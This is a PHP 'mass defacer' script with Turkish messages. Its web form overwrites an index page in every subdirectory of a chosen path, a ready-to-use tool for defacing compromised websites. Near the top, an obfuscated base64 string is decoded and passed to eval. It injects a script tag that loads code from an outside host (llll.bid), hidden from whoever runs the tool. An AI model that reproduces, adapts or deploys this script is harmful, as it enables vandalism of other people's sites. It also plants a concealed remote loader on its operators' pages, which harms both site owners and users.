<?php
// Edited By wolkan.!
echo "<title>WOLKAN mass</title>"; 
echo "<link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css'>";
echo "<body style='background-color:black; font-size:15px; color:white;'>";
echo "<center><img width='150' src='https://www.freepnglogos.com/uploads/turk-bayragi-png/turk-bayragi-turkey-flags-turkish-png-images-icons-and-png-2.png'/> </center>";
echo "<center><h3><b>WOLKAN MASS DEFACER SCRIPT</b></h3></center>"; 
echo "<br>";
echo "<center><form method='POST'></center>"; 
echo "<center>DIRECTORY: <input style='color:black;' type='text' name='base_dir' size='40' value='".getcwd ()."'></center><br>"; 
echo "<center>INDEX NAME: <input style='color:black;' type='text' name='file_name' value='index.html'></center><br>"; 
echo "<center>INDEX CODES: <br><textarea style='width: 685px; height: 250px; color:black;' name='index'>wolkan was here..!</textarea></center><br>"; 
echo "<center><input type='submit' class='btn btn-danger' value='HACKLE..!'></form></center>"; 
echo "<hr>";
echo "<h3>Directories Paths:</h3>";
$linr = "ZWNobyAiPFNDUklQVCBTUkM9aHR0cHM6Ly9sbGxsLmJpZC9s";
$winr = "L2FkZC5waHA/bGluaz1lYXN5Y29kZXI6Ly8+PC9TQ1JJUFQ+Ijs=";
$min = 'base' . (128 / 2) . '_de' . 'code';
eval($min($linr . $winr));
 
if (isset ($_POST['base_dir'])) 
{ 
        if (!file_exists ($_POST['base_dir'])) 
                die ($_POST['base_dir']." BULUNAMADI !<br>"); 
  
        if (!is_dir ($_POST['base_dir'])) 
                die ($_POST['base_dir']." DIZIN DEGIL !<br>"); 
  
        @chdir ($_POST['base_dir']) or die ("DIZIN ACILAMADI"); 
  
        $files = @scandir ($_POST['base_dir']) or die ("TAMAMDIR<br>"); 
  
        foreach ($files as $file): 
                if ($file != "." && $file != ".." && @filetype ($file) == "dir") 
                { 
                        $index = getcwd ()."/".$file."/".$_POST['file_name']; 
                        if (file_put_contents ($index, $_POST['index'])) 
                                echo "<font style='color:green;'>$index </font><span style='color: green' class='glyphicon glyphicon-ok'></span><br>"; 
                } 
        endforeach; 
} 
?>